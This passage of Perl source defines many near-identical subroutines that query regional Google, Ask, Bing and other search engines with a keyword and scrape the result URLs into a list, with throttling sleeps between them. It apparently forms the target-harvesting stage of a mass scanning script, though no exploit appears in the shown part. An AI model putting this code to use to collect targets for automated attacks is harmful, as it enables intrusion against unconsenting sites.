                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleMX() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.mx/search?q=".uri_escape($key)."&hl=&cr=countryMX&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleMX/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleAU() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.au/search?q=".uri_escape($key)."&hl=&cr=countryAU&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleAU/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(2);

sub googleRU() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.ru/search?q=".uri_escape($key)."&hl=&cr=countryRU&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleRU/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleAT() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.at/search?q=".uri_escape($key)."&hl=&cr=countryAT&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleAT/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googlePL() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.pl/search?q=".uri_escape($key)."&hl=&cr=countryPL&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googlePL/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleIL() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.il/search?q=".uri_escape($key)."&hl=&cr=countryIL&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleIL/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleTR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.tr/search?q=".uri_escape($key)."&hl=&cr=countryTR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleTR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleUA() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.ua/search?q=".uri_escape($key)."&hl=&cr=countryUA&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleUA/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleGR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.gr/search?q=".uri_escape($key)."&hl=&cr=countryGR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleGR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleJP() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.jp/search?q=".uri_escape($key)."&hl=&cr=countryJP&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleJP/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleCN() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.cn/search?q=".uri_escape($key)."&hl=&cr=countryCN&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleCN/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleMY() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.my/search?q=".uri_escape($key)."&hl=&cr=countryMY&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleMY/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleTH() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.th/search?q=".uri_escape($key)."&hl=&cr=countryTH&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleTH/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleIN() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.in/search?q=".uri_escape($key)."&hl=&cr=countryIN&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleIN/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleKR() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.kr/search?q=".uri_escape($key)."&hl=&cr=countryKR&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleKR/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleRO() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.ro/search?q=".uri_escape($key)."&hl=&cr=countryRO&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleRO/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googleTW() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.com.tw/search?q=".uri_escape($key)."&hl=&cr=countryTW&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleTW/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(3);

sub googleZA() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.co.za/search?q=".uri_escape($key)."&hl=&cr=countryZA&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googleZA/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub googlePT() {

    my @list;

    my $key = $_[0];

    for (my $i=0; $i<=1000; $i+=100){

        my $search = ("http://www.google.pt/search?q=".uri_escape($key)."&hl=&cr=countryPT&as_qdr=&num=100&filter=&start=".$i."&sa=N");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"\/url\?q=http:\/\/([^"]*)\"/g) {

            my $link = $1;

            if ($link !~ /googlePT/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub ask() {

        my @list;

        my $key = $_[0];

        for (my $i=1; $i<=1000; $i+=100) {

                my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=1&frstpgo=0&o=0&l=dir&qid=05D10861868F8C7817DAE9A6B4D30795&page=".$i."&jss=");

                my $res = &search_engine_query($search);

                while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

                        if ($link !~ /ask\.com/){

                                my @grep = &links($link);

                                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub askCA() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://ca.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askCA\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub askDE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://de.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askDE\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askIT() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://it.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askIT\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askUK() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://uk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askUK\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askFR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://fr.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askFR\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askES() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://es.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askES\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askRU() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://ru.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askRU\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub askNL() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://nl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askNL\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askPL() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://pl.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askPL\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askAT() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://at.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askAT\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askSE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://se.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askSE\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askDK() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://dk.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askDK\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askNO() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://no.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askNO\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub askAU() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://au.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askAU\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askBR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://br.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askBR\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub askMX() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://mx.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askMX\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub askJP() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=100; $i+=1) {

        my $search = ("http://jp.ask.com/web?q=".uri_escape($key)."&qsrc=0&frstpgo=0&o=0&l=dir&qid=BC8234276535BC11853E5F40B17E3B01&page=".$i."&jss=1");

        my $res = &search_engine_query($search);

        while ($res =~ m/href=\"http:\/\/(.*?)\" onmousedown=/g) {

            my $link = $1;

            if ($link !~ /askJP\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub onet() {

        my @list;

        my $key = $_[0];

        my $b   = 0;

        for ($b=1; $b<=400; $b+=10) {

                my $search = ("http://szukaj.onet.pl/".$b.",query.html?qt=".uri_escape($key));

                my $res = &search_engine_query($search);

                while ($res =~ m/<a href=\"http:\/\/(.*?)\">/g) {

                        my $link = $1;

                        if ($link !~ /onet|webcache|query/){

                                my @grep = &links($link);

                push(@list,@grep);

                        }

                }

        }

        return @list;

}

 

sub clusty() {

    my @list;

        my $key = $_[0];

    my $b   = 0;

        for ($b=10; $b<=200; $b+=10) {

        my $search = ("http://search.yippy.com/search?input-form=clusty-simple&v%3Asources=webplus-ns-aaf&v%3Aproject=clusty&query=".uri_escape($key)."&v:state=root|root-".$b."-20|0&");

        my $res = &search_engine_query($search);

                if ($res !~ /next/) {$b=100;}

        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {

            my $link = $1;

            if ($1 !~ /yippy\.com/){

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bing() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=400; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&first=".$i);

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

                        my $link = $1;

            if ($link !~ /google/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingDE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=de&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingDE/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub bingUK() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=uk&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingUK/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingCA() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ca&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingCA/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingBR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=br&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingBR/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingFR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=fr&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingFR/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingES() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=es&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingES/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingIT() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=it&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingIT/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub bingBE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=be&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingBE/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingNL() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nl&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingNL/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingPT() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=pt&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingPT/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingNO() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=no&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingNO/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingDK() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=dk&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingDK/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingSE() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=se&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingSE/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub bingCH() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ch&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingCH/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingNZ() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=nz&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingNZ/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingRU() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=ru&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingRU/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingJP() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=jp&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingJP/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingCN() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=cn&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingCN/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingKR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=kr&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingKR/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

sleep(4);

sub bingMX() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

        my $search = ("http://www.bing.com/search?q=".uri_escape($key)."&cc=mx&rf=1&first=".$i."&FORM=PORE");

        my $res = &search_engine_query($search);

        while ($res =~ m/<a href=\"?http:\/\/([^\"]*)\"/g) {

            my $link = $1;

            if ($link !~ /msn|live|bingMX/) {

                my @grep = &links($link);

                push(@list,@grep);

            }

        }

    }

    return @list;

}

 

sub bingAR() {

    my @list;

    my $key = $_[0];

    for (my $i=1; $i<=1000; $i+=10) {

